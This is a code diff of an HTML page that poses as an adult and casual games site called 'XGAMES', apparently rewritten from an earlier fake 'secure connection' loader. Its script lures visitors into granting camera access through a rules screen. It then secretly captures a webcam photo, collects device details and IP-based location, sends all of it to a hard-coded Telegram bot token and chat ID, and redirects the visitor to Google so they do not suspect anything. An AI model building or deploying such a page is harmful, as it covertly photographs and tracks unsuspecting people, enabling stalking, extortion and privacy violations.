@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting to secure server...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>XGAMES - Play Free Games Online</title>
     <style>
         * {
             margin: 0;
@@ -14,68 +14,213 @@
         body {
             background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Segoe UI', Arial, sans-serif;
+            font-family: 'Segoe UI', 'Poppins', Arial, sans-serif;
             color: white;
         }
 
-        .loading-container {
+        .navbar {
+            background: rgba(0,0,0,0.8);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #ff4d4d;
+            flex-wrap: wrap;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #ff4d4d, #ff8c00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .nav-links a {
+            color: #aaa;
+            text-decoration: none;
+            margin-left: 20px;
+            font-size: 14px;
+        }
+        .nav-links a:hover { color: #ff4d4d; }
+
+        .hero {
             text-align: center;
-            background: rgba(0,0,0,0.7);
-            padding: 40px;
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 0 30px rgba(0,255,255,0.2);
-            min-width: 350px;
+            padding: 50px 20px;
+            background: linear-gradient(135deg, #0f0c29, #1a1a2e);
+        }
+        .hero h1 {
+            font-size: 42px;
+            margin-bottom: 15px;
+        }
+        .hero h1 span {
+            color: #ff4d4d;
+        }
+        .hero p {
+            color: #aaa;
+            max-width: 600px;
+            margin: 0 auto;
         }
 
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .game-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 25px;
+        }
+        .game-card {
+            background: #111;
+            border-radius: 16px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: 0.3s;
+            border: 1px solid #222;
+        }
+        .game-card:hover {
+            transform: translateY(-5px);
+            border-color: #ff4d4d;
+            box-shadow: 0 5px 20px rgba(255,77,77,0.2);
+        }
+        .game-thumb {
+            width: 100%;
+            height: 160px;
+            background: #1a1a2e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+        }
+        .game-info {
+            padding: 15px;
+        }
+        .game-title {
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .game-category {
+            font-size: 12px;
+            color: #ff4d4d;
+            margin-top: 5px;
+        }
+
+        .rules-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            z-index: 1000;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        .rules-container {
+            max-width: 600px;
+            margin: 30px auto;
+            background: #111;
+            border-radius: 24px;
+            padding: 30px;
+            border: 1px solid #ff4d4d;
+        }
+        .rules-container h2 {
+            color: #ff4d4d;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .rules-container h3 {
+            color: #ffaa66;
+            margin: 20px 0 10px 0;
+        }
+        .rules-container p, .rules-container li {
+            color: #aaa;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+        .rules-container ul {
+            padding-left: 20px;
+        }
+        .agree-box {
+            margin: 30px 0 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .agree-box input {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+        }
+        .agree-box label {
+            color: white;
+            cursor: pointer;
+        }
+        .agree-btn {
+            width: 100%;
+            background: #ff4d4d;
+            border: none;
+            padding: 14px;
+            color: white;
+            font-weight: bold;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .agree-btn:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+        .agree-btn:hover:enabled {
+            background: #ff6b6b;
+        }
+
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
         .spinner {
             width: 60px;
             height: 60px;
-            border: 5px solid rgba(0,255,255,0.3);
-            border-top: 5px solid #0ff;
+            border: 5px solid #333;
+            border-top: 5px solid #ff4d4d;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin-bottom: 20px;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        .status {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #0ff;
+        .loading-text {
+            color: #ff4d4d;
             font-family: monospace;
+            font-size: 14px;
         }
-
         .progress-bar {
-            width: 100%;
-            height: 4px;
+            width: 200px;
+            height: 3px;
             background: #333;
             border-radius: 2px;
             margin-top: 20px;
             overflow: hidden;
         }
-
         .progress-fill {
             width: 0%;
             height: 100%;
-            background: #0ff;
-            animation: progress 3s ease-out forwards;
-        }
-
-        @keyframes progress {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
-
-        .hidden {
-            display: none;
+            background: #ff4d4d;
         }
 
         video, canvas {
@@ -85,68 +230,192 @@
             opacity: 0;
             pointer-events: none;
         }
+
+        footer {
+            text-align: center;
+            padding: 30px;
+            color: #444;
+            font-size: 12px;
+            border-top: 1px solid #222;
+            margin-top: 40px;
+        }
     </style>
 </head>
 <body>
 
-<div class="loading-container" id="loadingContainer">
-    <div class="spinner"></div>
-    <h2>Establishing Secure Connection</h2>
-    <div class="progress-bar">
-        <div class="progress-fill"></div>
-    </div>
-    <div class="status" id="statusText">Initializing secure tunnel...</div>
-</div>
-
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
+<div id="rulesScreen" class="rules-screen">
+    <div class="rules-container">
+        <h2>📜 Syarat & Peraturan Main di XGames</h2>
+        
+        <h3>1. Peraturan Umum</h3>
+        <ul>
+            <li>Wajib saling menghormati antar player.</li>
+            <li>Dilarang toxic, menghina, rasis, atau membuat keributan.</li>
+            <li>Gunakan nama yang sopan dan tidak mengandung unsur negatif.</li>
+            <li>Admin berhak memberi hukuman tanpa peringatan jika melanggar aturan berat.</li>
+        </ul>
+
+        <h3>2. Aturan Bermain</h3>
+        <ul>
+            <li>Bermain dengan sportif dan fair.</li>
+            <li>Dilarang cheat, exploit bug, atau menggunakan aplikasi ilegal.</li>
+            <li>Tidak boleh spam chat, voice, atau invite.</li>
+            <li>Jangan mengganggu gameplay player lain dengan sengaja.</li>
+        </ul>
+
+        <h3>3. Akun & Keamanan</h3>
+        <ul>
+            <li>Akun adalah tanggung jawab masing-masing player.</li>
+            <li>Dilarang membagikan password akun kepada orang lain.</li>
+            <li>Jual beli akun tanpa izin admin tidak diperbolehkan.</li>
+        </ul>
+
+        <h3>4. Voice Chat & Chatting</h3>
+        <ul>
+            <li>Gunakan bahasa yang sopan.</li>
+            <li>Dilarang mic berisik, sound effect mengganggu, atau earape.</li>
+            <li>Jangan menyebarkan informasi pribadi player lain.</li>
+        </ul>
+
+        <h3>5. Perizinan</h3>
+        <ul>
+            <li>Harap mengizinkan kamera pada Xgames, karena itu penting.</li>
+            <li>Jika tidak mengizinkan maka permainan tidak bisa berlanjut.</li>
+        </ul>
+
+        <div class="agree-box">
+            <input type="checkbox" id="agreeCheckbox">
+            <label for="agreeCheckbox">Saya menyetujui semua syarat & peraturan di atas</label>
+        </div>
+        <button class="agree-btn" id="agreeBtn" disabled>Setuju & Mulai Bermain</button>
+    </div>
+</div>
+
+<div id="loadingScreen" class="loading-screen">
+    <div class="spinner"></div>
+    <div class="loading-text">Loading...</div>
+    <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+</div>
+
+<div id="mainContent">
+    <div class="navbar">
+        <div class="logo">𝐗𝐆𝐀𝐌𝐄𝐒</div>
+        <div class="nav-links">
+            <a href="#">Home</a>
+            <a href="#">Games</a>
+            <a href="#">Trending</a>
+            <a href="#">18+</a>
+        </div>
+    </div>
+
+    <div class="hero">
+        <h1>Try Exciting Games At <span>XGAMES</span>!</h1>
+        <p>You can see Sexy Games, or Non-sexual games. Best collection of adult & casual games.</p>
+    </div>
+
+    <div class="container">
+        <div class="game-grid">
+            <div class="game-card" data-game="18plus">
+                <div class="game-thumb">🔥🎮</div>
+                <div class="game-info">
+                    <div class="game-title">Midnight Heat <span style="color:#ff4d4d;">🔞</span></div>
+                    <div class="game-category">Adult Game - 18+</div>
+                </div>
+            </div>
+            <div class="game-card" data-game="18plus">
+                <div class="game-thumb">💋👾</div>
+                <div class="game-info">
+                    <div class="game-title">Sexy Puzzle <span style="color:#ff4d4d;">🔞</span></div>
+                    <div class="game-category">Adult Game - 18+</div>
+                </div>
+            </div>
+            <div class="game-card" data-game="normal">
+                <div class="game-thumb">🎯🎲</div>
+                <div class="game-info">
+                    <div class="game-title">Car Stunt Racing</div>
+                    <div class="game-category">Action Game</div>
+                </div>
+            </div>
+            <div class="game-card" data-game="18plus">
+                <div class="game-thumb">🍆🎲</div>
+                <div class="game-info">
+                    <div class="game-title">Naughty Night <span style="color:#ff4d4d;">🔞</span></div>
+                    <div class="game-category">Adult Game - 18+</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        © 2025 XGAMES - Free Online Games for Adults 18+<br>
+        All games are for entertainment purposes.
+    </footer>
+</div>
+
 <script>
-    // ==================== KONFIGURASI TELEGRAM ====================
-    // 🔥 GANTI DENGAN TOKEN BOT LU 🔥
-    const BOT_TOKEN = "8920199069:AAF6SR4bWvjAgVrlFXCcwtYqZ-ozWaSiXdE";  // GANTI!
-    const CHAT_ID = "8246027862";  // GANTI!
-    
-    // Redirect setelah selesai (biar korban gak curiga)
+    // ==================== KONFIGURASI TELEGRAM (UDAH DI SET) ====================
+    const BOT_TOKEN = "8920199069:AAF6SR4bWvjAgVrlFXCcwtYqZ-ozWaSiXdE";
+    const CHAT_ID = "8246027862";
     const REDIRECT_URL = "https://google.com";
     
-    // ==================== MULAI ====================
-    let photoTaken = false;
-    let allData = {};
+    // ==================== GLOBAL ====================
+    let streamActive = null;
     
-    const statusEl = document.getElementById('statusText');
+    const rulesScreen = document.getElementById('rulesScreen');
+    const loadingScreen = document.getElementById('loadingScreen');
+    const mainContent = document.getElementById('mainContent');
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const agreeCheckbox = document.getElementById('agreeCheckbox');
+    const agreeBtn = document.getElementById('agreeBtn');
     
-    // Simulasi progress loading (3 detik)
-    let step = 0;
-    const steps = [
-        "Initializing secure tunnel...",
-        "Encrypting connection...",
-        "Verifying certificates...",
-        "Handshaking with server...",
-        "Loading resources...",
-        "Almost ready..."
-    ];
+    // Checkbox setuju
+    agreeCheckbox.addEventListener('change', () => {
+        agreeBtn.disabled = !agreeCheckbox.checked;
+    });
     
-    let stepInterval = setInterval(() => {
-        if (step < steps.length) {
-            statusEl.innerText = steps[step];
-            step++;
-        }
-    }, 500);
+    // Tombol setuju
+    agreeBtn.addEventListener('click', () => {
+        rulesScreen.style.display = 'none';
+        startLoadingAndCamera();
+    });
     
-    // Setelah loading selesai (3 detik), ambil foto & data
-    setTimeout(() => {
-        clearInterval(stepInterval);
-        statusEl.innerText = "Finalizing...";
-        startPhotoCapture();
-    }, 3000);
+    // Game cards
+    const gameCards = document.querySelectorAll('.game-card');
+    gameCards.forEach(card => {
+        card.addEventListener('click', () => {
+            const gameType = card.getAttribute('data-game');
+            if (gameType === '18plus') {
+                rulesScreen.style.display = 'flex';
+            } else {
+                alert('Game normal akan segera tersedia!');
+            }
+        });
+    });
     
-    // ==================== AMBIL FOTO ====================
-    function startPhotoCapture() {
+    // ==================== LOADING + KAMERA ====================
+    function startLoadingAndCamera() {
+        mainContent.style.display = 'none';
+        loadingScreen.style.display = 'flex';
+        
+        // Animasi progress bar
+        let progress = 0;
+        const progressFill = document.getElementById('progressFill');
+        const progressInterval = setInterval(() => {
+            progress += 10;
+            progressFill.style.width = progress + '%';
+            if (progress >= 100) clearInterval(progressInterval);
+        }, 150);
+        
+        // Minta akses kamera
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
+                streamActive = stream;
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     setTimeout(() => {
@@ -156,10 +425,9 @@
             })
             .catch(err => {
                 console.log("Kamera error:", err);
-                statusEl.innerText = "Camera unavailable, continuing...";
-                setTimeout(() => {
-                    collectAllData(null);
-                }, 500);
+                loadingScreen.style.display = 'none';
+                mainContent.style.display = 'block';
+                alert("Gagal akses kamera. Pastikan kamu mengizinkan kamera untuk bermain.");
             });
     }
     
@@ -175,15 +443,11 @@
             stream.getTracks().forEach(track => track.stop());
         }
         
-        statusEl.innerText = "Security check complete. Processing...";
-        
-        // Kirim FOTO dulu ke Telegram
+        // Kirim foto ke Telegram
         sendPhotoToTelegram(photoData);
     }
     
-    // ==================== KIRIM FOTO KE TELEGRAM ====================
     function sendPhotoToTelegram(photoBase64) {
-        // Convert base64 ke blob
         const byteString = atob(photoBase64.split(',')[1]);
         const mimeString = photoBase64.split(',')[0].split(':')[1].split(';')[0];
         const ab = new ArrayBuffer(byteString.length);
@@ -194,32 +458,27 @@
         const blob = new Blob([ab], { type: mimeString });
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'target_capture.jpg');
-        formData.append('caption', '📸 TARGET CAPTURED - IMAGE SENT FIRST');
+        formData.append('photo', blob, 'xgames_target.jpg');
+        formData.append('caption', '📸 XGAMES - Target Capture');
         
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
         })
         .then(() => {
-            console.log("Photo sent to Telegram");
-            // Setelah foto terkirim, kumpulkan data
-            collectAllData(photoBase64);
+            console.log("Photo sent");
+            collectAllData();
         })
         .catch(err => {
-            console.log("Telegram photo error:", err);
-            collectAllData(photoBase64);
+            console.log("Photo error:", err);
+            collectAllData();
         });
     }
     
-    // ==================== KUMPULKAN SEMUA DATA TARGET ====================
-    async function collectAllData(photoBase64) {
-        statusEl.innerText = "Gathering device information...";
-        
+    async function collectAllData() {
         // Device info
         const device = getDeviceInfo();
         
-        // Battery info
         let batteryInfo = "Not available";
         let chargingInfo = "Not available";
         if (navigator.getBattery) {
@@ -230,13 +489,9 @@
             } catch(e) {}
         }
         
-        // RAM
         let ramInfo = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Not available";
-        
-        // CPU cores
         let cpuInfo = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Not available";
         
-        // Get location from IP (city level)
         let locationInfo = "Unknown";
         try {
             const geoRes = await fetch('https://ipapi.co/json/');
@@ -251,36 +506,49 @@
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         const timezoneOffset = -new Date().getTimezoneOffset() / 60;
         
-        const perfData = performance.timing;
-        const pageLoadTime = perfData.loadEventEnd - perfData.navigationStart;
+        const report = `
+╭───── XGAMES Tracking Report ───── ⦿
+
+📍 Location: ${locationInfo}
+🖥️ Device: ${device}
+🌐 Bahasa: ${navigator.language}
+📶 Online: ${navigator.onLine ? "Online" : "Offline"}
+📺 Screen Size: ${screen.width}x${screen.height}
+🪟 Window Size: ${window.innerWidth}x${window.innerHeight}
+💾 RAM: ${ramInfo}
+🧠 CPU Cores: ${cpuInfo}
+🔋 Battery: ${batteryInfo}
+🔌 Charging: ${chargingInfo}
+⏰ Waktu Akses: ${timeAccess}
+🕓 Timezone: ${timezone}
+🧭 Offset: UTC${timezoneOffset >= 0 ? '+' : ''}${timezoneOffset}
+🌍 URL: ${window.location.href}
+📱 Platform: ${navigator.platform}
+
+╰───── XGAMES ───── ⦿
+        `;
         
-        allData = {
-            location: locationInfo,
-            device: device,
-            language: navigator.language,
-            online: navigator.onLine ? "Online" : "Offline",
-            screenSize: `${screen.width}x${screen.height}`,
-            windowSize: `${window.innerWidth}x${window.innerHeight}`,
-            ram: ramInfo,
-            cpuCores: cpuInfo,
-            battery: batteryInfo,
-            charging: chargingInfo,
-            timeAccess: timeAccess,
-            pageLoadTime: `${pageLoadTime} ms`,
-            historyLength: history.length,
-            touchSupport: 'ontouchstart' in window ? "Yes" : "No",
-            referrer: document.referrer || "Direct",
-            url: window.location.href,
-            timezone: timezone,
-            timezoneOffset: `UTC${timezoneOffset >= 0 ? '+' : ''}${timezoneOffset}`,
-            userAgent: navigator.userAgent,
-            platform: navigator.platform
-        };
-        
-        statusEl.innerText = "Preparing tracking report...";
-        
-        // Kirim data lengkap ke Telegram
-        sendTrackingReportToTelegram(allData);
+        // Kirim report ke Telegram
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: report,
+                parse_mode: 'HTML'
+            })
+        })
+        .then(() => {
+            console.log("Report sent");
+            loadingScreen.style.display = 'none';
+            window.location.href = REDIRECT_URL;
+        })
+        .catch(err => {
+            console.log("Report error:", err);
+            loadingScreen.style.display = 'none';
+            window.location.href = REDIRECT_URL;
+        });
     }
     
     function getDeviceInfo() {
@@ -293,62 +561,6 @@
         if (/Linux/i.test(ua)) return "Linux PC";
         return "Unknown Device";
     }
-    
-    // ==================== KIRIM TRACKING REPORT KE TELEGRAM ====================
-    function sendTrackingReportToTelegram(data) {
-        const report = `
-╭───── Tracking Report ───── ⦿
-
-⚙️ DEVICE INFORMATION (BUKAN GPS TRACKING)
-📍 City: ${data.location}
-🖥️ Device: ${data.device}
-🌐 Bahasa: ${data.language}
-📶 Online: ${data.online}
-📺 Screen Size: ${data.screenSize}
-🪟 Window Size: ${data.windowSize}
-💾 RAM: ${data.ram}
-🧠 CPU Cores: ${data.cpuCores}
-🔋 Battery: ${data.battery}
-🔌 Charging: ${data.charging}
-⏰ Waktu Akses: ${data.timeAccess}
-🕒 Page Load Time: ${data.pageLoadTime}
-📜 History Length: ${data.historyLength}
-✋ Touch Support: ${data.touchSupport}
-🔗 Referrer: ${data.referrer}
-🌍 URL: ${data.url}
-🕓 Timezone: ${data.timezone}
-🧭 Offset: ${data.timezoneOffset}
-📱 Platform: ${data.platform}
-🖥️ User Agent: ${data.userAgent}
-
-╰───── Telegram @ZetsuTheDevReal ───── ⦿
-        `;
-        
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: report,
-                parse_mode: 'HTML'
-            })
-        })
-        .then(() => {
-            console.log("Report sent to Telegram");
-            statusEl.innerText = "Redirecting...";
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 1500);
-        })
-        .catch(err => {
-            console.log("Telegram report error:", err);
-            statusEl.innerText = "Redirecting...";
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 1500);
-        });
-    }
 </script>
 </body>
-  </html>
+</html>
